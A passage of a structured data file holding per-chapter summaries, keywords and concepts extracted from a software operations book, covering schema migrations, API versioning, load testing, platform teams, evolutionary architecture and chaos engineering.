expansions and added shims.\nOnce every instance is on the new code, those triggers are no longer necessary, so you can just delete them.\nDo put the deletion into a new migration, though.\nIt’s also time now to apply another round of schema changes.\n• Apply NOT NULL constraints on the new columns.\nThat’s because the old application version wouldn’t know how to satisfy them.\nInstances running on the old version would start throwing errors on actions that had been just fine.\nA migrations framework keeps every individual change around as a version- controlled asset in the codebase.\nIn contrast, the old style of schema change relied on a modeling tool—or sometimes a DBA acting like a modeling tool—to create the whole schema at once.\nNew revisions in the tool would create a single SQL file to apply all the changes at once.\nWhether you write migrations by hand or generate them from a tool, the time- ordered sequence of all schema changes is helpful to keep around.\nFor schemaless databases, the cleanup phase is another time to run one- shots.\nAs with the contraction phase for relational databases, this is when you delete documents or keys that are no longer used or remove elements of documents that aren’t needed any more.\nIf you start from the premise that your build pipeline should be able to catch all mechanical errors like that, then it’s obvious that you should start speci- fying your schema changes in something other than SQL DDL.",
    "keywords": [
      "version",
      "Translator Doc",
      "Deployment",
      "application",
      "time",
      "document",
      "documents",
      "n’t",
      "application version",
      "Doc",
      "translator",
      "machines",
      "migration",
      "report erratum",
      "document version"
    ],
    "concepts": [
      "deployment",
      "deployments",
      "deploy",
      "deployed",
      "version",
      "versions",
      "documents",
      "document",
      "migration",
      "migrates"
    ]
  },
  {
    "chapter_number": 33,
    "title": "Segment 33 (pages 266-273)",
    "start_page": 266,
    "end_page": 273,
    "summary": "However, as we make changes to add features, we need to be careful not to break consum- ing applications.\nHelp Others Handle Your Versions\nIt won’t come as a surprise to learn that different consumers of your service have different goals and needs.\nThey shouldn’t have to make a new release at the same time as yours just so you can change your API.\nThat means most new versions of a service should be compatible.\nHandling Versions • 264\n“Be conservative in what you do, be liberal in what you accept from others.”1 It has mostly worked out for the Internet as a whole (subject to a lot of caveats from Chapter 11, Security, on page 215,) so let’s see if we can apply this prin- ciple to protocol versions in our applications.\nIn order to make compatible API changes, we need to consider what makes for an incompatible change.\nHow many distinguish between “Transfer-Encoding” and “Content-Encoding?” When we say our service accepts HTTP or HTTPS, what we usually mean is that it accepts a subset of HTTP, with limitations on the accepted content types and verbs, and responds with a restricted set of status codes and cache control headers.\nHelp Others Handle Your Versions • 265\nWith this view of communication as a stack of layered agreements, it’s easy to see what makes a breaking change: any unilateral break from a prior agreement.\nWe should be able to make a list of changes that would break agreements:\nRejecting a network protocol that previously worked • Rejecting request framing or content encoding that previously worked • Rejecting request syntax that previously worked • Rejecting request routing (whether URL or queue) that previously worked • Adding required fields to the request • Forbidding optional information in the request that was allowed before • Removing information from the response that was previously guaranteed • Requiring an increased level of authorization\nBad news: the service now rejects requests that it previously accepted.\nHandling Versions • 266\nAs soon as the service went live, its implementation becomes the de facto specification.\nOnce the service is public, a new version cannot reject requests that would’ve been accepted before.\nThat allows other services to consume yours by coding to the specification.\nI also recommend running randomized, generative tests against services you consume.\nHelp Others Handle Your Versions • 267\nAs the consuming group, my team wrote FIT tests that illustrated every case in the specification.2 We thought of these as contract tests.\nI don’t think it would have worked nearly as well if we’d had the implementing team write the tests.\nAs the figure illustrates, such tests are owned by the calling service, so they act as an early warning system if the provider changes.\nHandling Versions • 268\nAfter exhausting all other options, you may still find that a breaking change is required.\nBreaking API Changes\nThere are still things you can do to help consumers of your service.\nThe very first prerequisite is to actually put a version number in your request and reply message formats.\nThis is the version number of the format itself, not of your application.\nAny individual consumer is likely to support only one version at a time, so this is not for the consumer to automatically bridge versions.\nLet’s use the following routes from a peer-to-peer lending service (the service that collects a loan application for credit analysis) as a running example.\nView the state of a specific application\nIt turns out that a successful service needs to be changed more often than a useless one.\nIt also turns out that one legal entity can be both a borrower and a lender at different times, but that each one can only operate in certain countries (the ones in which they are incorporated.) So we have breaking changes to deal with in both the data returned with the “/request” routes and a need to replace the “/borrower” routes with something more general.\nHelp Others Handle Your Versions • 269\nYou can also query your logs to see how many consumers are using each version over time.\n2. Use the “Accept” header on GET requests to indicate the desired version.\nFor example, we can define a media type “application/vnd.lendzit.loan- request.v1” and a new media type “application/vnd.lendzit.loan-request.v2” for our versions.\nIf a client fails to specify a desired version, it gets the default (the first nondeprecated version.) Advantage: Clients can upgrade without changing routes because any URLs stored in databases will con- tinue to work.\n3. Use an application-specific custom header to indicate the desired version.\nWe can define a header like “api-version.” Advantages: Complete flexibility, and it’s orthogonal to the media type and URL.\nDisadvantages: You’ll need to write routing helpers for your specific framework.\n4. For PUT and POST only, add a field in the request body to indicate the intended version.",
    "keywords": [
      "version",
      "versions",
      "API accepts HTTP",
      "API",
      "service",
      "URL",
      "Request",
      "service accepts HTTP",
      "Handling Versions",
      "n’t",
      "report erratum",
      "accepts HTTP",
      "Rejecting request",
      "previously",
      "application"
    ],
    "concepts": [
      "versions",
      "version",
      "request",
      "requests",
      "requester",
      "applications",
      "specification",
      "specifications",
      "specific",
      "routed"
    ]
  },
  {
    "chapter_number": 34,
    "title": "Segment 34 (pages 274-281)",
    "start_page": 274,
    "end_page": 281,
    "summary": "Handling Versions • 270\nframework change, where I’d really like to have the new version running on a separate cluster.\nNo matter which approach you choose, as the provider, you must support both the old and the new versions for some period of time.\nWhen you roll out the new version (with a zero-downtime deployment, of course), both versions should operate side by side.\nBe sure to run tests that mix calls to the old API version and the new API version on the same entities.\nYou’ll often find that entities created with the new version cause internal server errors when accessed via the old API.\nIf you do put a version in the URLs, be sure to bump all the routes at the same time.\nEven if just one route has changed, don’t force your consumers to keep track of which version numbers go with which parts of your API.\nOnce your service receives a request, it has to process it according to either the old or the new API.\nI’ll assume that you don’t want to just make a complete copy of all the v1 code to handle v2 requests.\nMethods that handle the new API go directly to the most current version of the business logic.\nMethods that handle the old API get updated so they convert old objects to the current ones on requests and convert new objects to old ones on responses.\nNow you know how to make your service behave like a good citizen.\nHandle Others’ Versions\nRight now, we’re just going to talk about how to design for version changes.\nAfter all, they may not observe the same safety rules we just described, so a new deployment could change the set of required parameters or apply new constraints.\nHandle Others’ Versions • 271\nLet’s look at the loan application service again.\nThe requester data gets a new numeric field for “creditScore.” The loan data gets a new field for “collateralCategory” and a new allowed value for the “riskAd- justments” list.\nA caller may send you all, some, or none of these new fields and values.\nYou put some new fields in your request specification, but that doesn’t mean you can assume anyone will obey them.\nRemember that your suppliers can deploy a new version at any time, too.\nHandling Versions • 272\nThese problems are another reason I like the contract testing approach from Help Others Handle Your Versions, on page 263.\nIt sets up a request, issues the request, then makes assertions about the response based on the data in the original request.\nThat verifies how the end-to-end loop works right now, but it doesn’t verify that the caller correctly conforms to the contract, nor that the caller can handle any response the supplier is allowed to send.\nConsequently, some new release in the provider can change the response in an allowed but unexpected way, and the consumer will break.\nThe second part checks that the caller is prepared to handle responses from the provider.\nEven if your most trusted service provider claims to do zero-downtime deployments every time, don’t forget to protect your service.\nIn this chapter, we’ve seen how to handle our versions to aid others and how to defend ourselves against version changes in our consumers and providers.\nI had joined this huge team (more than three hundred in total) nine months earlier to help build a complete replacement for a retailer’s online store, content management, customer service, and order-processing systems.\nThree months of load testing and emergency code changes.\n(He actually had a big red button, which was wired to an LED in the next room, where a techie clicked Reload on the browser being projected on the big screen.) The new site appeared like magic on the big screen in the grand conference room.\nThe new site was live and in production.\nWe expected to see traffic ramping up on the new servers starting at about 9:05 a.m.\n(The browser in the conference room was configured to bypass the CDN and hit the site directly, going straight to what the CDN called the “origin servers.” Marketing people aren’t the only ones who know how to engage in smoke and mirrors.) In fact, we could immediately see the new traffic coming into the site.\nIn a Datamation article in 1968, Melvin Conway described a sociological phenomenon: “Organizations which design systems are constrained to produce designs whose structure are copies of the communication structures of these organizations.” It is sometimes stated colloquially as, “If you have four teams working on a compiler, you will get a four-pass compiler.”\nI’ve since found Conway’s law useful in a proscriptive mode—creating the communi- cation structure that I wanted the software to embody—and in a descriptive mode— mapping the structure of the software to help understand the real communication structure of the organization.\nEven if the system is built with the stability patterns (this one wasn’t), a completely new stack means that nobody can be sure how it’ll run in produc- tion.\nEarly in my time on the project, I realized that the development teams were building everything to pass testing, not to run in production.",
    "keywords": [
      "Handle Others’ Versions",
      "API version",
      "version",
      "Versions",
      "API",
      "request",
      "handle",
      "service",
      "n’t",
      "version changes",
      "Others’ Versions",
      "report erratum",
      "site",
      "time",
      "request Response Response"
    ],
    "concepts": [
      "request",
      "requests",
      "requester",
      "service",
      "services",
      "versions",
      "code",
      "make",
      "makes",
      "server"
    ]
  },
  {
    "chapter_number": 35,
    "title": "Segment 35 (pages 282-289)",
    "start_page": 282,
    "end_page": 289,
    "summary": "The barrier to change in the test environment was high enough, however, that most of the development team chose to ignore the discrepancies rather than lose one or two weeks of their daily build-deploy-test cycles.\nLoad Testing • 281\nIn setting up the production environment, I had inadvertently volunteered to assist with the load test.\nLoad Testing\nWith a new, untried system, the client knew that load testing would be critical to a successful launch.\nIt keeps the session alive for some number of minutes after the user last clicked.\nThat means the session is absolutely guaranteed to last longer than the user.\nCounting sessions overestimates the number of users, as demon- strated in the next figure.\nThe number of active sessions is one of the most important measurements about a web system, but don’t confuse it with counting users.\nYou define a test plan, create some scripts (or let your vendor create the scripts), configure the load generators and test dispatcher, and fire off a test run during the small hours of the night.\nSo, we got a bunch of people on a conference call: the test manager, an engineer from the load test service, an architect from the development team, a DBA to watch database usage, and me (monitoring and analyzing applications and servers).\nTraffic analysis gives you nothing but variables: browsing patterns, number of pages per session, conversion rates,\nLoad Testing • 283\nA user who checks out often accesses twelve pages during the session, whereas a user who just scans the site and goes away typically hits no more than seven pages.\nOn the first test run, the test had ramped up to only 1,200 concurrent users when the site got completely locked up.\nAfter three months of this testing effort and more than sixty new application builds, we had achieved a tenfold increase in site capacity.\nThe site could handle 12,000 active sessions, which we estimated to represent about 10,000 customers at a time (subject to all the caveats about counting customers).\nFurthermore, when stressed over the 12,000 sessions, the site didn’t crash anymore, although it did get a little “flaky.” During these three months, marketing had also reassessed their target for launch.\nInstead of 25,000 concurrent users, they thought 12,000 sessions would suffice for launch during the slow part of the year.\nSo after all that load testing, what happened on the day of the launch?\nIt was the number of sessions that killed the site.\nWith session replication enabled (it was), each session gets serialized and transmitted to a session backup server after each page request.\nAll of our load testing was done with scripts that mimicked real users with real browsers.\nThe scripts all used cookies to track sessions.\nUnfortunately, on the day of the switch, they drove customers to old-style URLs. The web servers were configured to send all requests for .html to the application servers (because of the application servers’ ability to track and report on sessions).\nThat meant that each customer coming from a search engine was guaranteed to create a session on the app servers, just to serve up a 404 page.\nThe search engines noticed a change on the site, so they started refetching all the cached pages they had.\nWe found one search engine that was creating up to ten sessions per second.\nOf course, none of these scrapers properly handled cookies, so each of them was creating additional sessions.\nFinally, there were the sources that we just called “random weird stuff.” (We didn’t really use the word “stuff.”) For example, one computer on a Navy base would show up as a regular browsing session, and then about fifteen minutes after the last legitimate page request, we’d see the last URL get requested again and again.\nMore sessions.\nFirst, we tested the application the way it was meant to be used.\nTest scripts would request one URL, wait for the response, and then request another URL that was present on the response page.\nNone of the load-testing scripts tried hitting the same URL, without using cookies, 100 times per second.\nSince the site used only cookies for session tracking, not URL rewriting, all of our load test scripts used cookies.\nIt should be the same with load testing.\nWe saw this from our very first day of load testing, but we didn’t understand the significance.\nIf we set the throttle to 25 percent, then only 25 percent of requests for this gateway page would serve the real home page.\nOver the next three weeks, we had an engineer watching the session counts at all times, ready to pull back on the throttle anytime the volume appeared to be getting out of hand.\nThe home page was completely dynamically generated, from the JavaScript for the drop-down category menus to the product details and even to the link on the bottom of the page for “terms of use.” One of the application platform’s key selling points was personalization.\nSo this home page being generated and served up five million times a day was exactly the same every single time it got served.\nStill, if the application server got involved in sending the home page, it would take time and create a session that would occupy memory for the next thirty minutes.\nThis particular application server’s session failover mechanism was based on serialization.\nThe user’s session remains bound to the original server instance, so all new requests go back to the instance that already has the user’s session in memory.\nAfter every page request, the user’s session is serialized and sent",
    "keywords": [
      "session",
      "Load Testing",
      "sessions",
      "site",
      "production",
      "Load",
      "users",
      "application",
      "n’t",
      "day",
      "active sessions",
      "home page",
      "user",
      "Customers",
      "report erratum"
    ],
    "concepts": [
      "session",
      "sessions",
      "tested",
      "pages",
      "servers",
      "server",
      "site",
      "sites",
      "applications",
      "application"
    ]
  },
  {
    "chapter_number": 36,
    "title": "Segment 36 (pages 290-298)",
    "start_page": 290,
    "end_page": 298,
    "summary": "Should the user’s original instance go down—deliberately or otherwise—the next request gets directed to a new instance, chosen by the load manager.\nThe agile development movement embraced change in response to business conditions.\nSoftware change can create new products and markets.\nIt can open up space for new alliances and new competition, creating surface area between businesses that used to be in different industries—like light bulb manufacturers running server-side software on a retailer’s cloud com- puting infrastructure.\nYou launch your minimum viable product, hoping to learn fast, release fast, and find that crucial product-market fit before the cash runs out.\nSome pieces of software truly have no upside potential to rapid change and adaptation.\nIn some industries, every release of software goes through expensive, time-consuming\nTo make a change, your company has to go through a decision cycle, as illustrated in the figure that follows.\nFinally, someone must see whether the change had the expected effect, and then the process starts over.\nIn a small company, this decision loop might involve just one or two people.\nThe time it takes to go all the way around this cycle, from observation to action, is the key constraint on your company’s ability to absorb or create change.\nSpeed up your decision loop and you can react faster.\nAgile and lean development methods helped remove delay from the “act” portion of the decision loop.\nDevOps helps remove even more delay in “act” and offers tons of new tools to help with “observe.” But we need to start the timer when the initial observations are made, not when the story lands in the backlog.\nThrashing happens when your organization changes direction without taking the time to receive, process, and incorporate feedback.\nBut be careful not to shorten development cycle time so much that it’s faster than how quickly you get feedback from the environment.\nIt happens when the feedback from the environment is slower than the rate of control changes.\nIt creates team confusion, unfinished work, and lost productivity.\nFor example, if development moves faster than feedback, don’t use the spare cycles to build dev tools that speed up deployment.\nInstead, build an experimentation platform to help speed up observation and decisions.\nIn the sections that follow, we’ll look at some ways to change the structure of your organization to speed up the decision loop.\nWe’ll also consider some ways to change processes to move from running one giant decision loop to running many of them in parallel.\nPlatform Team\nWhen we look at the layers from Chapter 7, Foundations, on page 141, we see the need for software development up and down the stack.\nWhether you’re in the cloud or in your own data center, you need a platform team that views application development as its customer.\nThat team should provide API and command-line provisioning for the common capabilities that appli- cations need, as well as the things we looked at in Chapter 10, Control Plane, on page 193:\nOne important thing for the platform team is to remember they are implement- ing mechanisms that allow others to do the real provisioning.\nIn other words, the platform team should not implement all your specific monitoring rules.\nInstead, this team provides an API that lets you install your monitoring rules into the monitoring service provided by the platform.\nLikewise, the platform team doesn’t built all your API gateways.\nIt builds the service that builds the API gateways for individual application teams.\nThat doesn’t replace the need for your own platform team, but it does give the team a massive head start.\nThe platform team must not be held accountable for application availability.\nThat must be on the application teams.\nInstead, the platform team must be measured on the availability of the platform itself.\nThe platform team needs a customer-focused orientation.\nThe best rule of thumb is this: if your developers only use the platform because it’s mandatory, then the platform isn’t good enough.\nIt’s common these days, typically in larger enterprises, to find a group called the DevOps team.\nThis team sits between development and operations with the goal of moving faster and automating releases into production.\nIt’s a cultural transforma- tion, a shift from ticket- and blame-driven operations with throw-it-over-the-wall releases to one based on open sharing of information and skills, data-driven decision- making about architecture and design, and common values about production avail- ability and responsiveness.\nWhen a company creates a DevOps team, it has one of two objectives.\nOne possibility is that it’s really either a platform team or a tools team.\nIn that case, be very explicit that the team’s goal is not to produce software or a platform.\nTeam members need to spread the values and encourage others to adopt the spirit of DevOps.\nThe release process described in Chapter 12, Case Study: Waiting for Godot, on page 237, rivals that of NASA’s mission control.\nThe literature on agile methods, lean development, continuous delivery, and incremental funding all make a powerful case for frequent releases in terms of user delight and business value.\nWith respect to production operations, however, there’s an added benefit of frequent releases.\nThe faster that feedback loop operates, the more accurate those improvements will be.\nThe right response is to reduce the effort needed, remove people from the process, and make the whole thing more automated and standardized.\nIf it looks good, then the code is cleared for release to the remaining machines.\nIn that case, deploying in waves lets you manage how fast you expose customers to the new code.\nSecond, they all limit the number of customers who might be exposed to a bug, either by restricting the time a bug might be visible or by restricting the number of people who can reach the new code.\nThe idea is to make your organization antifragile by allowing independent change and variation in small grains.\nThere’s a vicious cycle that comes into play: more code means it’s harder to change, so every piece of code needs to be more generalized, but that leads to more code.",
    "keywords": [
      "Platform Team",
      "team",
      "Change",
      "platform",
      "releases",
      "session backup server",
      "release",
      "DevOps Team",
      "decision loop",
      "report erratum",
      "n’t",
      "time",
      "process",
      "software",
      "development"
    ],
    "concepts": [
      "team",
      "teams",
      "change",
      "changes",
      "development",
      "developers",
      "process",
      "processes",
      "software",
      "need"
    ]
  },
  {
    "chapter_number": 37,
    "title": "Segment 37 (pages 299-307)",
    "start_page": 299,
    "end_page": 307,
    "summary": "Instead of building a single “promotions service” as before, you could build two services that can each chime in when a new user hits your front end.\nIn the next figure, each service makes a decision based on whatever user infor- mation is available.\nThe user offers still need a database, but maybe the page-based offers just require a table of page types embedded in the code.\nAfter all, if you can deploy code changes in a matter of minutes, do you really need to invest in content management?\nShut off the service, delete the code, and reassign the team.\nTeam-Scale Autonomy\nYou’re probably familiar with the concept of the two-pizza team.\nIt’s not just about having fewer people on a team.\nA self-sufficient two-pizza team also means each team member has to cover more than one discipline.\nYou can’t have a two-pizza team if you need a dedicated\nThe two-pizza team is about reducing external dependencies.\nIf you ever find that you need to update both the provider and caller of an service interface at the same time, it’s a warning sign that those services are strongly coupled.\n(See Nonbreaking API Changes, on page 263, for strategies to avoid breakage.) If not, consider treating the new interface as a new route in your API.\nDependencies across teams also create timing and queuing problems.\nIf you need a DBA from the enterprise data architecture team to make a schema change before you can write the code, it means you have to wait until that DBA is done with other tasks and is available to work on yours.\nArchitecture review boards, release management reviews, change control committees, and the People’s Committee for Proper Naming Conventions...each review process adds more and more time.\nThis is why the concept of the two-pizza team is misunderstood.\nThe platform team I discussed in Platform Team, on page 292, has a big part to play in all this.\nJust trying telling your CEO that the company is too efficient and needs to introduce some inefficiency!\nEfficiency sometimes translates to “fully utilized.” In other words, your com- pany is “efficient” if every developer develops and every designer designs close to 100 percent of the time.\nWe’ve seen this lesson time and time again from The Goal [Gol04], to Lean Software Development [PP03], to Principles of Product Development Flow [Rei09], to Lean Enterprise [HMO14] and The DevOps Handbook [KDWH16]: Keep the people busy all the time and your overall pace slows to a crawl.\nA more enlightened view of efficiency looks at the process from the point of view of the work instead of the workers.\nThat can make it harder to change for the future.\nIt reduced cycle time and had a side effect of reducing the space needed for assembly.\nAsk anyone who relies on running builds with Visual Studio out of Team Foundation Server how easily they can move to Jenkins and Git. For that matter, just try to port your\nAll the hidden connections that make it efficient also make it harder to adapt.\nA fully automated build pipeline that delivers containers straight into Kubernetes every time you make a commit and that shows commit tags on the monitoring dashboard will let you move a lot faster, but at the cost of making some serious commitments.\nFor example, in 2017 many companies are starting to feel uneasy about their level of dependency on Amazon Web Services.\nIf there’s a natural order to software, it’s the Big Ball of Mud.4 Without close attention, dependencies proliferate and coupling draws disparate systems into one brittle whole.\nIn its place, he offers the rule of design evolution, “Form follows failure.” That is, changes in the design of such commonplace things as forks and paper clips are motivated more by the things early designs do poorly than those things they do well.\nIn this section, we’ll look at how the system’s architecture can make it easier to adapt over time.\nIn Building Evolutionary Architectures [FPK17], Neal Ford, Rebecca Parsons, and Patrick Kua define an evolutionary architecture as one that “supports incremental, guided change as a first principle across multiple dimensions.” Given that definition, you might reasonably ask why anyone would build a nonevolutionary architecture!\nSadly, it turns out that many of the most basic architecture styles inhibit that incremental, guided change.\nFor example, the typical enterprise applica- tion uses a layered architecture something like the one shown in the following illustration.\nThe layers are traditionally separated to allow technology to change on either side of the boundary.\nWe get something like component-based architecture.\nIf you squint, they look like microservice instances that happen to run in the same process.\nLayers could change independently if each layer expressed the fundamental concepts of that layer.\n“Form” is a GUI concept, as is “Table” (but a different kind of table than the persistence one!) The boundary between each layer should be a matter of translating concepts.\nEach component owns its whole stack, from database up through user interface or API.\nThat does mean the eventual human interface needs a way to federate the UI from different components.\nMake a few of these component-oriented stacks and you’ll arrive at a structure called “self-contained systems.”5\nIn the example we’ve just worked through, it allows incremental guided change along the dimensions of “business requirements” and “interface technology.” You should get comfortable with some of the other architecture styles that lend themselves to evolutionary architecture:\nGood for incremental change in require- ments, combining work from different teams.\nVulnerable to semantic change in message formats over time.\nA startup in the hypergrowth stage probably values scaling the tech team much more than it values long-term evolution of the business requirements.\nThat means any particular change is likely to encounter one of those and incur a large risk of “action at a distance.” This makes developers hesitant to touch the problem classes, so necessary refactoring pressure is ignored and the problem gets worse.\nThe need for extensive testing grows with the software and the team size.\nDevelopers need a longer ramp-up period before they can work safely in the codebase.\nEven if they get adopted into a good home, it’s easy to get overloaded when you have twice as many services as developers.\nThat way the service as a whole can survive the loss of the leader without manual interven- tion to reconfigure the cluster.\nDirect member-to-member dependencies create hard linkages preventing either side from changing independently.\nThe calling application instances in cluster 1 depend on the DNS name (bound to a load-balanced IP address) cluster 2 serves.\nThat’s needed for distributed algorithms like leader election and failure detection.\nLoose clustering in this way allows each cluster to scale independently.",
    "keywords": [
      "RequestDetails Promotions Shared",
      "Oﬀers User OﬀersUser",
      "Promotions Shared Database",
      "Page Oﬀers User",
      "Promotions Shared",
      "Oﬀers User",
      "team",
      "User OﬀersUser IDPage",
      "architecture",
      "Caller RequestDetails Promotions",
      "User",
      "make",
      "time",
      "User-Based Promotions User",
      "Promotions User OﬀersPage"
    ],
    "concepts": [
      "architecture",
      "architectures",
      "service",
      "services",
      "user",
      "development",
      "developers",
      "developer",
      "develops",
      "changes"
    ]
  },
  {
    "chapter_number": 38,
    "title": "Segment 38 (pages 308-316)",
    "start_page": 308,
    "end_page": 316,
    "summary": "2. Look it up by calling another service.\nIf the answer isn’t in our own database, we need to call another service.\nIn order to get item information, your service must already know who to call!\nThat implicit dependency limits you to working with just the one service provider.\nIf you need to support items from two different “universes,” it’s going to be very disruptive.\nBut making implicit context into explicit context has big benefits inside services as well.\nIf you’ve worked on a Ruby on Rails system, you might have run into difficulty when trying to use multiple relational databases from a single service.\nClark identify six “modular operators.” Their work was in the context of computer hardware, but it applies to distributed service-based systems as well.\nEvery module boundary gives you an option to apply these operators in the future.\nSplitting breaks a design into modules, or a module into submodules.\nSplitting requires insight into how the features can be decomposed so that cross-dependencies in the new modules are minimized and the extra work of splitting is offset by the increased value of more general modules.\nModule 1\nModule 2\nModule 2\nModule 3\nModule 4\nModule 4\nModule 3\nExample: We start with a module that determines how to ship products to a customer.\nOne way to split the module is shown in the next figure.\nA different way to split the modules might be one per carrier.\nThis makes the modules act a bit more like competitors.\nIn the original decomposition, if just one of the modules is broken, then the whole feature doesn’t work.\nIf we divide the work by carrier, as illustrated in the figure on page 310, then one carrier’s service may be down or malfunctioning but the others will continue to work.\nOf course, this assumes the parent module makes calls in parallel and times out properly when a module is unresponsive.\nThe key with splitting is that the interface to the original module is unchanged.\nAfterward, it delegates work to the new modules but supports the same interface.\nThe original module and the substitute need to share a common interface.\nAugmenting is adding a module to a system.\nFor example, if you decompose your system along technical lines you might end up with a module that writes to the database, a module that renders HTML, a module that supports an API, and a module that glues them all together.\nHow many of those modules could you exclude?\nSuppose instead you have a module that recommends related products.\nThe module offers an API and manages its own data.\nInversion works by taking functionality that’s distributed in several modules and raising it up higher in the system.\nIn the following figure, several services have their own way of performing A/B tests.\nIndividual services don’t need to decide whether to put a user in the control group or the test group.\nBaldwin and Clark look at porting in terms of moving hardware or operating system modules from one CPU to another.\nPorting is really about repurposing a module from a different system.\nAny time we use a service created by a different project or system, we’re “porting” that service to our system, as shown in the following figure.\nModule 1\nModule 2\nModule 3\nModule X\nModule Y\nIt clearly means a new dependency, and if the road map of that service diverges from our needs, then we must make a substitution.\nThat doesn’t mean the new caller has to replicate all the unit and integration tests that the module itself runs.\nIt’s more that the caller should make sure its own calls work as expected.\nAnother way of “porting” a module into our system is through instantiation.\nIf we need to fork the code and deploy a new instance, that’s also a way to bring the service into our system.\nBaldwin and Clark argue that these six operators can create any arbitrarily complex structure of modules.\nWhen you look at a set of features, think of three different ways to split them into modules.\nThink of how you can make modules that allow exclusion or augmentation.\nWe’ve looked at a few ways to build your architecture to make it adaptable:\nBe explicit about context so that services can work with many participants",
    "keywords": [
      "module",
      "System",
      "modules",
      "service",
      "n’t",
      "System Architecture",
      "report erratum",
      "Architecture",
      "work",
      "systems",
      "operating system modules",
      "System Module",
      "module System",
      "Information Architecture",
      "services"
    ],
    "concepts": [
      "module",
      "modules",
      "service",
      "services",
      "look",
      "looked",
      "working",
      "works",
      "worked",
      "work"
    ]
  },
  {
    "chapter_number": 39,
    "title": "Segment 39 (pages 317-324)",
    "start_page": 317,
    "end_page": 324,
    "summary": "But since it can be slow to walk through every event in history to figure out the value of attribute A on entity E, we often keep views to make it fast to answer that question.\nWith an event journal, several views can each project things in a different way.\nYou’ll see in Embrace Plurality, on page 321, that one catalog will never be enough.\nA catalog service should really handle many catalogs.\nGiven that, how should we identify which catalog goes with which user?\nThe first, most obvious approach is to assign an owner to each catalog, as shown in the following figure.\nAdd (POST Owner ID and Item data)\nItem URL\n1. The catalog service must couple to one particular authority for users.\n2. One owner can only have one catalog.\nIf a consuming application needs more than one catalog, it has to create multiple identities in the authority service (multiple account IDs in Active Directory, for example).\nWe should remove the idea of ownership from the catalog service altogether.\nIt should be happy to create many, many fine catalogs for anyone who wants one.\nAny user can create a catalog.\nThe catalog service issues an identifier for that specific cat- alog.\nThe user provides that catalog ID on subsequent requests.\nOf course, a catalog URL is a perfectly adequate identifier.\nCatalog URL\nCreate (POST to Catalogs Service)\nAdd (PUT to Catalog URL)\nItem URL\nQuery (GET on Catalog URL w/query params)Results\nIn effect, the catalog service acts like a little standalone SaaS business.\nIt has many customers, and the customers get to decide how they want to use that catalog.\nThey will change their catalogs all the time.\nAs shown in the figure on page 318, a “policy proxy” can map from a client ID (whether that client is internal or external makes no difference) to a catalog ID.\nThis way, questions of ownership and access control can be factored out of the catalog service itself into a more centrally controlled location.\nMap fromclient ID to catalog IDclient ID\ncatalog ID\nLike a pointer, you can also pass the URL around as an identifier.\nThe typical way to get the item information is shown in the figure on page 319.\nThe front end looks up that ID in the database, gets the item details, and displays them.\nCatalog\nNow we have to get all the retailer’s items into our database.\nThat’s usually very hard, so we decide to have the front end look at the item ID and decide which database to hit, as shown in the figure that follows.\nCatalog\nThe only numbers that make sense are “zero,” “one,” and “many.” We can use URL dualism to support many databases by using URLs as both the item identifier and a resolvable resource.\nCatalog\nAs long as the new service returns a useful representation of that item, it will work.\nAnd who says the item details have to be served by a dynamic, database- backed service?\nThe item URL could point to an outbound API gateway that proxies a request to a supplier or partner.\nYou might recognize this as a variation of “Explicit Context.” (See Explicit Context, on page 306.) We use URLs because they carry along the context we need to fetch the underlying representation.\nIt gives us much more flexibility than plugging item ID numbers into a URL template string for a service call.\nIf you can exchange a URL for a representation that you can use like a customer, then as far as you care, it is a customer service, whether the data came from a database or a static file.\nThe basic customer-visible concepts of cat- egory, product, and item were very well established.",
    "keywords": [
      "catalog",
      "URL",
      "Command-query responsibility segregation",
      "catalog URL",
      "catalog service",
      "Item URL Query",
      "Catalog URL Caller",
      "Item",
      "Item URL",
      "Customer",
      "service",
      "Reading and writing",
      "Command-query responsibility",
      "Event",
      "events"
    ],
    "concepts": [
      "url",
      "urls",
      "services",
      "service",
      "item",
      "items",
      "catalog",
      "catalogs",
      "different",
      "difference"
    ]
  },
  {
    "chapter_number": 40,
    "title": "Segment 40 (pages 325-333)",
    "start_page": 325,
    "end_page": 333,
    "summary": "Coordinating all the releases needed to introduce that concept would make Rube Goldberg shake his head in sadness.\nBut price point was not a concept that other systems needed for their own purposes.\nThere’s no such thing as a natural data model, there are only choices we make about how to represent things, relationships, and change over time.\nWe need to be careful about exposing internal concepts to other systems.\nThere’s no such thing as a “natural” data model, only choices that we make.\nWe can invert the relationship by making our service issue identifiers rather than receiving an “owner ID.” And we can take advantage of the dual nature of URLs to both act like an opaque token or an address we can deref- erence to get an entity.\nEither systems grow over time, adapting to their changing environment, or they decay until their costs out- weigh their benefits and then die.\nThat’s in contrast to designing for change inside the software but disregarding the act of making that change live in production.\nChaos Engineering\nBreaking Things to Make Them Better\nAccording to the principles of chaos engineering,1 chaos engineering is “the discipline of experimenting on a distributed system in order to build confi- dence in the system’s capability to withstand turbulent conditions in pro- duction.” That means it’s empirical rather than formal.\nChaos engineering deals with distributed systems, frequently large-scale systems.\nStaging or QA environments aren’t much of a guide to the large- scale behavior of systems in production.\nChaos Engineering • 326\nThis is why chaos engineering emphasizes the whole-system perspective.\nAntecedents of Chaos Engineering\nChaos engineering draws from many other fields related to safety, reliability, and control, such as cybernetics, complex adaptive systems, and the study of high-reliability organizations.\nIn particular, the multidisciplinary field of resilience engineering offers a rich area to explore for new directions in chaos.2\nAntecedents of Chaos Engineering • 327\n(In this context, when Dekker talks about systems, he means the whole collection of people, technology, and processes, not just the information systems.) Over time, there’s pressure to increase the economic return of the system.\nHuman nature also means people don’t want to work at the upper limit of possible productivity.\nChaos engineering provides that balancing force.\nIt springs from the view that says we need to optimize our systems for availability and tolerance to disrup- tion in a hostile, turbulent world rather than aiming for throughput in an idealized environment.\nAnother thread that led to chaos engineering has to do with the challenge of measuring events that don’t happen.\nChaos Engineering • 328\nIn fact, we expect that disorder will occur, but we want to make sure there’s enough of it during normal operation that our systems aren’t flummoxed when it does occur.\nWe use chaos engineering the way a weightlifter uses iron: to create tolerable levels of stress and breakage to increase the strength of the system over time.\nProbably the best known example of chaos engineering is Netflix’s “Chaos Monkey.” Every once in a while, the monkey wakes up, picks an autoscaling cluster, and kills one of its instances.\nThe Chaos Monkey tool was born during Netflix’s migration to Amazon’s AWS cloud infrastructure and a microservice architecture.\nAs services proliferated, engineers found that availability could be jeopardized by an increasing number of components.\nUnless they found a way to make the whole service immune to component failures, they would be doomed.\nSo every cluster needed to autoscale and recover from failure of any instance.\nIt was an “and.” They would use stability patterns to make individual instances more likely to survive.\nSecond, as noted by Heather Nakama at the third Chaos Community Day, people really like the word “monkey.”\nAt 